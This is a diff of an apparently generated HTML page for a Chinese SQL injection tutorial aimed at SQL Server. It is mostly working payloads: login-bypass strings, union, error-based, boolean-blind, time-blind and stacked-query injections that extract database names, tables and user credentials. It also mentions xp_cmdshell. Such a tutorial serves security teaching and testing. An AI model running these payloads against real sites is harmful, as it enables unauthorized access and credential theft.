@@ -52,430 +52,344 @@
     <h1>SQL injection SQL注入 基于SQL server数据库</h1>
     <div class="post-meta">
       <time datetime="2026-06-29T05:56:09.000Z">2026.06.29</time>
-      <span>15 分钟阅读</span>
+      <span>14 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# SQL injection SQL注入 基于SQL Server数据库
-
-在SQL server注入点判断当前用户权限：
-
+    <h1 id="SQL-injection-SQL注入-基于SQL-Server数据库"><a href="#SQL-injection-SQL注入-基于SQL-Server数据库" class="headerlink" title="SQL injection SQL注入 基于SQL Server数据库"></a>SQL injection SQL注入 基于SQL Server数据库</h1><p>在SQL server注入点判断当前用户权限：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)</span><br><span class="line">--判断是否是db_owner权限</span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">--判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure>
 
-常见用户可控参数：
-
-id
-
-username
-
-password
-
-keyword
-
-sort
-
-page
-
-## 1. 万能账号密码
-
-数字型万能账号：
-
+<p>常见用户可控参数：</p>
+<p>id</p>
+<p>username</p>
+<p>password</p>
+<p>keyword</p>
+<p>sort</p>
+<p>page</p>
+<h2 id="1-万能账号密码"><a href="#1-万能账号密码" class="headerlink" title="1. 万能账号密码"></a>1. 万能账号密码</h2><p>数字型万能账号：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>a<span class="operator">&gt;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">&lt;</span>a<span class="operator">&gt;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- a</span></span><br></pre></td></tr></table></figure>
 
-单引号字符型万能账号：
-
+<p>单引号字符型万能账号：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>a<span class="operator">&gt;</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">&lt;a&gt;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-双引号字符型万能账号：
-
+<p>双引号字符型万能账号：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>a<span class="operator">&gt;</span>&quot; or &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span>&quot;--+</span><br><span class="line">&lt;a&gt;&quot; <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-数字型万能密码：
-
+<p>数字型万能密码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="comment">--+</span></span><br><span class="line">admin<span class="comment">-- a</span></span><br></pre></td></tr></table></figure>
 
-单引号字符型万能密码：
-
+<p>单引号字符型万能密码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="comment">-- a</span></span><br></pre></td></tr></table></figure>
 
-双引号字符型万能密码：
-
+<p>双引号字符型万能密码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;--+</span><br><span class="line">admin&quot;<span class="comment">-- a</span></span><br></pre></td></tr></table></figure>
 
-## 2. 基本类型
-
-### 2.1 数字型
-
-URL 地址中输入：
-
+<h2 id="2-基本类型"><a href="#2-基本类型" class="headerlink" title="2. 基本类型"></a>2. 基本类型</h2><h3 id="2-1-数字型"><a href="#2-1-数字型" class="headerlink" title="2.1 数字型"></a>2.1 数字型</h3><p>URL 地址中输入：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/ccc.aspx?id=1 and 1=1--+</span><br></pre></td></tr></table></figure>
 
-页面显示正常，继续下一步。
-
-SQL 语句类似于：
-
+<p>页面显示正常，继续下一步。</p>
+<p>SQL 语句类似于：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 
-URL 地址中输入：
-
+<p>URL 地址中输入：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/ccc.aspx?id=1 and 1=2--+</span><br></pre></td></tr></table></figure>
 
-页面异常、为空或结果变化，说明可能存在数字型注入。
-
-SQL 语句类似于：
-
+<p>页面异常、为空或结果变化，说明可能存在数字型注入。</p>
+<p>SQL 语句类似于：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
 
-### 2.2 字符型
-
-URL 地址中输入：
-
+<h3 id="2-2-字符型"><a href="#2-2-字符型" class="headerlink" title="2.2 字符型"></a>2.2 字符型</h3><p>URL 地址中输入：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/ccc.aspx?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;--+</span><br></pre></td></tr></table></figure>
 
-页面正常，继续下一步。
-
-SQL 语句类似于：
-
+<p>页面正常，继续下一步。</p>
+<p>SQL 语句类似于：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-URL 地址中输入：
-
+<p>URL 地址中输入：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/ccc.aspx?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;--+</span><br></pre></td></tr></table></figure>
 
-页面异常、为空或结果变化，说明可能存在字符型注入。
-
-SQL 语句类似于：
-
+<p>页面异常、为空或结果变化，说明可能存在字符型注入。</p>
+<p>SQL 语句类似于：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-## 3. SQL Server 常用信息函数
-
-当前数据库版本：
-
+<h2 id="3-SQL-Server-常用信息函数"><a href="#3-SQL-Server-常用信息函数" class="headerlink" title="3. SQL Server 常用信息函数"></a>3. SQL Server 常用信息函数</h2><p>当前数据库版本：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">@version</span></span><br></pre></td></tr></table></figure>
 
-当前数据库名：
-
+<p>当前数据库名：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DB_NAME()</span><br></pre></td></tr></table></figure>
 
-当前登录用户：
-
+<p>当前登录用户：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSTEM_USER</span></span><br><span class="line">SUSER_SNAME()</span><br><span class="line">USER_NAME()</span><br></pre></td></tr></table></figure>
 
-当前数据库用户：
-
+<p>当前数据库用户：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CURRENT_USER</span></span><br></pre></td></tr></table></figure>
 
-当前服务器名：
-
+<p>当前服务器名：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">@servername</span></span><br></pre></td></tr></table></figure>
 
-## 4. 基本手法
-
-### 4.1 Union 联合查询
-
-`order by` 根据不存在的列排序会报错，可以用来判断原查询列数，为 `union select` 做准备。
-
-适用于页面会回显数据库查询结果的情况。利用 `union select` 执行两条 `select` 语句，实现跨表查询。
-
-必要条件：
-
-- 两条 `select` 语句查询结果具有相同列数。
-- 对应位置的数据类型兼容。
-- 页面存在可控回显位。
-
-#### 4.1.1 基本流程
-
-找到注入点 ==> 判断数字型/字符型 ==> 判断列数 ==> 判断回显位 ==> 拿库名 ==> 拿表名 ==> 拿列名 ==> 拿数据
-
-#### 4.1.2 利用条件
-
-- 页面可以回显数据。
-- `union`、`select` 关键字未被过滤。
-- `select 1,2,3...` 合法。
-
-#### 4.1.3 payload
-
-查找注入点：
-
+<h2 id="4-基本手法"><a href="#4-基本手法" class="headerlink" title="4. 基本手法"></a>4. 基本手法</h2><h3 id="4-1-Union-联合查询"><a href="#4-1-Union-联合查询" class="headerlink" title="4.1 Union 联合查询"></a>4.1 Union 联合查询</h3><p><code>order by</code> 根据不存在的列排序会报错，可以用来判断原查询列数，为 <code>union select</code> 做准备。</p>
+<p>适用于页面会回显数据库查询结果的情况。利用 <code>union select</code> 执行两条 <code>select</code> 语句，实现跨表查询。</p>
+<p>必要条件：</p>
+<ul>
+<li>两条 <code>select</code> 语句查询结果具有相同列数。</li>
+<li>对应位置的数据类型兼容。</li>
+<li>页面存在可控回显位。</li>
+</ul>
+<h4 id="4-1-1-基本流程"><a href="#4-1-1-基本流程" class="headerlink" title="4.1.1 基本流程"></a>4.1.1 基本流程</h4><p>找到注入点 &#x3D;&#x3D;&gt; 判断数字型&#x2F;字符型 &#x3D;&#x3D;&gt; 判断列数 &#x3D;&#x3D;&gt; 判断回显位 &#x3D;&#x3D;&gt; 拿库名 &#x3D;&#x3D;&gt; 拿表名 &#x3D;&#x3D;&gt; 拿列名 &#x3D;&#x3D;&gt; 拿数据</p>
+<h4 id="4-1-2-利用条件"><a href="#4-1-2-利用条件" class="headerlink" title="4.1.2 利用条件"></a>4.1.2 利用条件</h4><ul>
+<li>页面可以回显数据。</li>
+<li><code>union</code>、<code>select</code> 关键字未被过滤。</li>
+<li><code>select 1,2,3...</code> 合法。</li>
+</ul>
+<h4 id="4-1-3-payload"><a href="#4-1-3-payload" class="headerlink" title="4.1.3 payload"></a>4.1.3 payload</h4><p>查找注入点：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1--+</span><br><span class="line">id=1 and 1=2--+</span><br></pre></td></tr></table></figure>
 
-使用二分法测试列数：
-
+<p>使用二分法测试列数：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 3--+</span><br></pre></td></tr></table></figure>
 
-测试回显位：
-
+<p>测试回显位：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2 union select &#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;</span><br></pre></td></tr></table></figure>
 
-拿版本信息：
-
+<p>拿版本信息：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,@@version,3--+</span><br></pre></td></tr></table></figure>
 
-拿当前数据库名：
-
+<p>拿当前数据库名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,DB_NAME(),3--+</span><br></pre></td></tr></table></figure>
 
-拿当前用户：
-
+<p>拿当前用户：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,SYSTEM_USER,3--+</span><br></pre></td></tr></table></figure>
 
-拿表名，方式一：
-
+<p>拿表名，方式一：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,name,3 from sys.tables--+</span><br></pre></td></tr></table></figure>
 
-拿表名，方式二：
-
+<p>拿表名，方式二：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,table_name,3 from information_schema.tables where table_type=&#x27;BASE TABLE&#x27;--+</span><br></pre></td></tr></table></figure>
 
-拿列名：
-
+<p>拿列名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
 
-拿数据：
-
+<p>拿数据：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,username,password from users--+</span><br></pre></td></tr></table></figure>
 
-SQL Server 没有 MySQL 的 `group_concat()`，常见聚合字符串方式如下：
-
-SQL Server 2017 及以上：
-
+<p>SQL Server 没有 MySQL 的 <code>group_concat()</code>，常见聚合字符串方式如下：</p>
+<p>SQL Server 2017 及以上：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> STRING_AGG(name, <span class="string">&#x27;,&#x27;</span>) <span class="keyword">from</span> sys.tables;</span><br></pre></td></tr></table></figure>
 
-低版本可用 XML 拼接：
-
+<p>低版本可用 XML 拼接：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> stuff((<span class="keyword">select</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> name <span class="keyword">from</span> sys.tables <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-联合查询中使用示例：
-
+<p>联合查询中使用示例：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select STRING_AGG(name, &#x27;,&#x27;) from sys.tables),3--+</span><br></pre></td></tr></table></figure>
 
-### 4.2 报错注入
-
-当页面返回数据库错误信息时，可以人为构造类型转换错误，使错误信息携带查询结果。
-
-优点：
-
-- 当 `union` 联合查询无法回显时可以尝试。
-- 对页面回显位要求较低。
-
-缺点：
-
-- 生产环境大多会屏蔽详细报错。
-- 不同 SQL Server 版本和中间件返回信息不同。
-
-#### 4.2.1 基本流程
-
-找到注入点 ==> 判断数字型/字符型 ==> 构造类型转换错误 ==> 拿库名 ==> 拿表名 ==> 拿列名 ==> 拿数据
-
-#### 4.2.2 convert 报错注入
-
-`convert(int, 字符串)` 将非数字字符串转换为整数时会报错，错误信息可能包含字符串内容。
-
-爆版本：
-
+<h3 id="4-2-报错注入"><a href="#4-2-报错注入" class="headerlink" title="4.2 报错注入"></a>4.2 报错注入</h3><p>当页面返回数据库错误信息时，可以人为构造类型转换错误，使错误信息携带查询结果。</p>
+<p>优点：</p>
+<ul>
+<li>当 <code>union</code> 联合查询无法回显时可以尝试。</li>
+<li>对页面回显位要求较低。</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>生产环境大多会屏蔽详细报错。</li>
+<li>不同 SQL Server 版本和中间件返回信息不同。</li>
+</ul>
+<h4 id="4-2-1-基本流程"><a href="#4-2-1-基本流程" class="headerlink" title="4.2.1 基本流程"></a>4.2.1 基本流程</h4><p>找到注入点 &#x3D;&#x3D;&gt; 判断数字型&#x2F;字符型 &#x3D;&#x3D;&gt; 构造类型转换错误 &#x3D;&#x3D;&gt; 拿库名 &#x3D;&#x3D;&gt; 拿表名 &#x3D;&#x3D;&gt; 拿列名 &#x3D;&#x3D;&gt; 拿数据</p>
+<h4 id="4-2-2-convert-报错注入"><a href="#4-2-2-convert-报错注入" class="headerlink" title="4.2.2 convert 报错注入"></a>4.2.2 convert 报错注入</h4><p><code>convert(int, 字符串)</code> 将非数字字符串转换为整数时会报错，错误信息可能包含字符串内容。</p>
+<p>爆版本：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,@@version)--+</span><br></pre></td></tr></table></figure>
 
-爆当前数据库名：
-
+<p>爆当前数据库名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,DB_NAME())--+</span><br></pre></td></tr></table></figure>
 
-爆当前用户：
-
+<p>爆当前用户：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,SYSTEM_USER)--+</span><br></pre></td></tr></table></figure>
 
-爆表名：
-
+<p>爆表名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,(select top 1 name from sys.tables))--+</span><br></pre></td></tr></table></figure>
 
-爆列名：
-
+<p>爆列名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&#x27;users&#x27;))--+</span><br></pre></td></tr></table></figure>
 
-爆数据：
-
+<p>爆数据：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=convert(int,(select top 1 username from users))--+</span><br></pre></td></tr></table></figure>
 
-#### 4.2.3 cast 报错注入
-
-`cast(字符串 as int)` 与 `convert` 类似。
-
-爆当前数据库名：
-
+<h4 id="4-2-3-cast-报错注入"><a href="#4-2-3-cast-报错注入" class="headerlink" title="4.2.3 cast 报错注入"></a>4.2.3 cast 报错注入</h4><p><code>cast(字符串 as int)</code> 与 <code>convert</code> 类似。</p>
+<p>爆当前数据库名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=cast(DB_NAME() as int)--+</span><br></pre></td></tr></table></figure>
 
-爆表名：
-
+<p>爆表名：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=cast((select top 1 name from sys.tables) as int)--+</span><br></pre></td></tr></table></figure>
 
-### 4.3 布尔盲注
-
-页面不直接回显数据，但真假条件会导致页面状态不同，例如内容变化、长度变化、状态码变化。
-
-#### 4.3.1 判断长度
-
-判断当前数据库名长度是否为 5：
-
+<h3 id="4-3-布尔盲注"><a href="#4-3-布尔盲注" class="headerlink" title="4.3 布尔盲注"></a>4.3 布尔盲注</h3><p>页面不直接回显数据，但真假条件会导致页面状态不同，例如内容变化、长度变化、状态码变化。</p>
+<h4 id="4-3-1-判断长度"><a href="#4-3-1-判断长度" class="headerlink" title="4.3.1 判断长度"></a>4.3.1 判断长度</h4><p>判断当前数据库名长度是否为 5：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and len(DB_NAME())=5--+</span><br></pre></td></tr></table></figure>
 
-判断当前数据库名长度是否大于 5：
-
+<p>判断当前数据库名长度是否大于 5：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and len(DB_NAME())&gt;5--+</span><br></pre></td></tr></table></figure>
 
-#### 4.3.2 逐字符判断
-
-SQL Server 常用字符串函数：
-
+<h4 id="4-3-2-逐字符判断"><a href="#4-3-2-逐字符判断" class="headerlink" title="4.3.2 逐字符判断"></a>4.3.2 逐字符判断</h4><p>SQL Server 常用字符串函数：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SUBSTRING</span>(string,<span class="keyword">start</span>,length)</span><br><span class="line">ASCII(<span class="type">character</span>)</span><br><span class="line">LEN(string)</span><br></pre></td></tr></table></figure>
 
-判断当前数据库名第 1 位字符是否为 `t`：
-
+<p>判断当前数据库名第 1 位字符是否为 <code>t</code>：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and substring(DB_NAME(),1,1)=&#x27;t&#x27;--+</span><br></pre></td></tr></table></figure>
 
-判断当前数据库名第 1 位字符 ASCII 是否为 116：
-
+<p>判断当前数据库名第 1 位字符 ASCII 是否为 116：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and ascii(substring(DB_NAME(),1,1))=116--+</span><br></pre></td></tr></table></figure>
 
-使用大小比较进行二分：
-
+<p>使用大小比较进行二分：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and ascii(substring(DB_NAME(),1,1))&gt;100--+</span><br></pre></td></tr></table></figure>
 
-### 4.4 时间盲注
-
-页面没有回显，真假页面也没有明显区别时，可以通过响应时间判断条件真假。
-
-SQL Server 延时函数：
-
+<h3 id="4-4-时间盲注"><a href="#4-4-时间盲注" class="headerlink" title="4.4 时间盲注"></a>4.4 时间盲注</h3><p>页面没有回显，真假页面也没有明显区别时，可以通过响应时间判断条件真假。</p>
+<p>SQL Server 延时函数：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span></span><br></pre></td></tr></table></figure>
 
-判断是否存在时间盲注：
-
+<p>判断是否存在时间盲注：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1; waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-如果不能堆叠语句，可以使用条件分支：
-
+<p>如果不能堆叠语句，可以使用条件分支：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 if (1=1) waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-判断数据库名长度：
-
+<p>判断数据库名长度：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 if (len(DB_NAME())=5) waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-判断数据库名第 1 位字符：
-
+<p>判断数据库名第 1 位字符：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 if (ascii(substring(DB_NAME(),1,1))=116) waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-字符型示例：
-
+<p>字符型示例：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;; if (len(DB_NAME())=5) waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-### 4.5 堆叠查询
-
-SQL Server 支持使用分号分隔多条语句，部分驱动或中间件允许堆叠查询。
-
-测试：
-
+<h3 id="4-5-堆叠查询"><a href="#4-5-堆叠查询" class="headerlink" title="4.5 堆叠查询"></a>4.5 堆叠查询</h3><p>SQL Server 支持使用分号分隔多条语句，部分驱动或中间件允许堆叠查询。</p>
+<p>测试：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1; select 1--+</span><br></pre></td></tr></table></figure>
 
-时间延迟测试：
-
+<p>时间延迟测试：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1; waitfor delay &#x27;0:0:5&#x27;--+</span><br></pre></td></tr></table></figure>
 
-注意：堆叠查询风险高，真实业务中应通过参数化查询、最小权限和禁止多语句执行来防护。
-
-### 4.6 宽字节、文件读写和系统命令差异
-
-MySQL 常见的 `load_file()`、`into outfile`、`secure_file_priv` 不适用于 SQL Server。
-
-SQL Server 中可能涉及以下高危功能：
-
-- `xp_cmdshell`
-- `sp_OACreate`
-- `OPENROWSET`
-- `BULK INSERT`
-
-这些能力通常需要较高权限或特殊配置，安全测试时应重点检查是否被禁用、是否被最小权限限制，不建议在非授权环境尝试。
-
-## 5. SQL Server 系统库和系统表
-
-查看所有数据库：
-
+<p>注意：堆叠查询风险高，真实业务中应通过参数化查询、最小权限和禁止多语句执行来防护。</p>
+<h3 id="4-6-宽字节、文件读写和系统命令差异"><a href="#4-6-宽字节、文件读写和系统命令差异" class="headerlink" title="4.6 宽字节、文件读写和系统命令差异"></a>4.6 宽字节、文件读写和系统命令差异</h3><p>MySQL 常见的 <code>load_file()</code>、<code>into outfile</code>、<code>secure_file_priv</code> 不适用于 SQL Server。</p>
+<p>SQL Server 中可能涉及以下高危功能：</p>
+<ul>
+<li><code>xp_cmdshell</code></li>
+<li><code>sp_OACreate</code></li>
+<li><code>OPENROWSET</code></li>
+<li><code>BULK INSERT</code></li>
+</ul>
+<p>这些能力通常需要较高权限或特殊配置，安全测试时应重点检查是否被禁用、是否被最小权限限制，不建议在非授权环境尝试。</p>
+<h2 id="5-SQL-Server-系统库和系统表"><a href="#5-SQL-Server-系统库和系统表" class="headerlink" title="5. SQL Server 系统库和系统表"></a>5. SQL Server 系统库和系统表</h2><p>查看所有数据库：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> master..sysdatabases;</span><br></pre></td></tr></table></figure>
 
-查看当前数据库所有表：
-
+<p>查看当前数据库所有表：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> sys.tables;</span><br></pre></td></tr></table></figure>
 
-查看当前数据库所有列：
-
+<p>查看当前数据库所有列：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name,column_name <span class="keyword">from</span> information_schema.columns;</span><br></pre></td></tr></table></figure>
 
-查看指定表字段：
-
+<p>查看指定表字段：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-查看当前数据库用户：
-
+<p>查看当前数据库用户：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> sys.database_principals;</span><br></pre></td></tr></table></figure>
 
-查看登录账号：
-
+<p>查看登录账号：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> master..syslogins;</span><br></pre></td></tr></table></figure>
 
-## 6. MySQL 与 SQL Server 注入差异
-
-| 功能 | MySQL | SQL Server |
-| --- | --- | --- |
-| 单行注释 | `#`、`-- ` | `-- ` |
-| 当前数据库 | `database()` | `DB_NAME()` |
